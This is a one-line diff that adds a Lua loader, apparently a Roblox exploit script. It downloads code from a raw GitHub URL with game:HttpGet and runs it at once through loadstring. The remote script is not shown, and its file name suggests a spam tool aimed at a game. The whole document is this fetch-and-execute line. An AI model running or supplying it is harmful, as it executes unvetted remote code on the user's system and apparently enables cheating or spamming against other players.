@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandeurMare/loaders/main/loaders/interrogation-ai-spam5-6y6qwu3qij5h57.lua"))()
